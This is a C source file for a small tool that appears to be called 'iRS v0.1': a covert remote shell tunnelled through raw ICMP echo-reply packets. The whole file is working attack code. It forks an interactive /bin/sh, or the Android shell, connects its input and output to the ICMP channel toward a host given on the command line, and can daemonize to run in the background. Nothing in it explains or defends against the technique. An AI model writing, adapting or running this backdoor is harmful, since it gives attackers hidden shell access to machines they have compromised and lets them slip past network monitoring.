#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <linux/ip.h>
#include <linux/icmp.h>

/* Helper functions */
#define BUF_SIZE 1024

static int (*net_read)(int fd, void *buf, size_t count);
static int (*net_write) (int fd, void *buf, size_t count);

static int icmp_type = ICMP_ECHOREPLY;;
static int id = 12345;

typedef struct
{
        struct iphdr ip;
        struct icmphdr icmp;
        int len;
        char data[BUF_SIZE];     /* Data */
} PKT;

typedef struct {
        struct icmphdr icmp;
        int len;
} PKT_TX;

static struct sockaddr_in dest;


int
raw_init (char *ip, int proto)
{
        int s;

        if ((s = socket (AF_INET, SOCK_RAW, proto)) < 0)
        {
                perror ("socket:");
                exit (1);
        }

        dest.sin_family = AF_INET;
        inet_aton (ip, &dest.sin_addr);
        fprintf (stderr, "+ Raw to '%s' (type : %d)\n", ip, icmp_type);

        return s;
}

/* ICMP */
u_short
icmp_cksum (u_char *addr, int len)
{
        register int sum = 0;
        u_short answer = 0;
        u_short *wp;

        for (wp = (u_short*)addr; len > 1; wp++, len -= 2)
                sum += *wp;

        /* Take in an odd byte if present */
        if (len == 1)
        {
                *(u_char *)&answer = *(u_char*)wp;
                sum += answer;
        }

        sum = (sum >> 16) + (sum & 0xffff); /* add high 16 to low 16 */
        sum += (sum >> 16);             /* add carry */
        answer = ~sum;                  /* truncate to 16 bits */

        return answer;
}

int
net_read_icmp (int s, void *buf, size_t count)
{
        PKT pkt;
        int len, l;

        l = read (s, &pkt, sizeof (PKT)); // Read IP + ICMP header
        if ((pkt.icmp.type == icmp_type) &&
            (ntohs(pkt.icmp.un.echo.id) == id))
        {
                len = ntohs (pkt.len);
                memcpy (buf, (char*)pkt.data, len);
                return len;
        }

        return 0;
}

int
net_write_icmp (int s, void *buf, size_t count)
{
        PKT_TX          *pkt;
        struct icmphdr *icmp = (struct icmphdr*) &pkt;
        int len;

        pkt = malloc (sizeof (PKT_TX) + count);
        icmp = (struct icmphdr*) pkt;
        pkt->len = htons(count);
        memcpy ((unsigned char*)pkt + sizeof(PKT_TX), buf, count);

        len = count + sizeof(int);
        len += sizeof (struct icmphdr);

        /* Build an ICMP Packet */
        icmp->type = icmp_type;
        icmp->code = 0;
        icmp->un.echo.id = htons(id);
        icmp->un.echo.sequence = htons(5);
        icmp->checksum = 0;
        icmp->checksum = icmp_cksum ((char*)icmp, len);

        sendto (s, pkt, len, 0,
                (struct sockaddr*) &dest,
                sizeof (struct sockaddr_in));
        free (pkt);
        return len;
}

/************************************************************/

int
start_shell (int s)
{
        char *name[3];

#ifdef VERBOSE
        printf ("+ Starting shell\n");
#endif
        dup2 (s, 0);
        dup2 (s, 1);
        dup2 (s, 2);

#ifdef _ANDROID
        name[0] = "/system/bin/sh";
#else
        name[0] = "/bin/sh";
#endif
        name[1] = "-i";
        name[2] = NULL;
        execv (name[0], name );
        exit (EXIT_FAILURE);

        return 0;
}


void
async_read (int s, int s1)
{
        fd_set rfds;
        struct timeval tv;
        int max = s > s1 ? s : s1;
        int len, r;
        char buffer[BUF_SIZE];  /* 1024 chars */
        max++;

        while (1)
        {
                FD_ZERO(&rfds);
                FD_SET(s,&rfds);
                FD_SET(s1,&rfds);

                /* Time out. */
                tv.tv_sec = 1;
                tv.tv_usec = 0;

                if ((r = select (max, &rfds, NULL, NULL, &tv)) < 0)
                {
                        perror ("select:");
                        exit (EXIT_FAILURE);
                }
                else if (r > 0) /* If there is data to process */
                {
                        if (FD_ISSET(s, &rfds))
                        {
                                memset (buffer, 0, BUF_SIZE);
                                if ((len = net_read (s, buffer, BUF_SIZE)) == 0) continue;
                                write (s1, buffer, len);
                        }
                        if (FD_ISSET(s1, &rfds))
                        {
                                memset (buffer, 0, BUF_SIZE);
                                if ((len = read (s1, buffer, BUF_SIZE)) <= 0) exit (EXIT_FAILURE);

                                net_write (s, buffer, len);
                        }
                }
        }
}

void
secure_shell (int s)
{
        pid_t pid;
        int sp[2];

        /* Create a socketpair to talk to the child process */
        if ((socketpair (AF_UNIX, SOCK_STREAM, 0, sp)) < 0)
        {
                perror ("socketpair:");
                exit (1);
        }

        /* Fork a shell */
        if ((pid = fork ()) < 0)
        {
                perror ("fork:");
                exit (1);
        }
        else
        if (!pid) /* Child Process */
        {
                close (sp[1]);
                close (s);

                start_shell (sp[0]);
                /* This function will never return */
        }

        /* At this point we are the father process */
        close (sp[0]);
#ifdef VERBOSE
        printf ("+ Starting async read loop\n");
#endif
        net_write (s, "iRS v0.1\n", 9);
        async_read (s, sp[1]);

}

int
main (int argc, char *argv[])
{
        int i =1;
        /* FIXME: Check command-line arguments */
        /* Go daemon ()*/

        net_read = net_read_icmp;
        net_write = net_write_icmp;

        if (argv[i][0] == 'd')
        {
                i++;
                daemon (0,0);
        }

        if (argv[i][0] == 's')
                secure_shell (raw_init (argv[i+1], IPPROTO_ICMP));
        else if (argv[i][0] == 'c')
                async_read (raw_init (argv[i+1], IPPROTO_ICMP), 0);

        return 0;
}
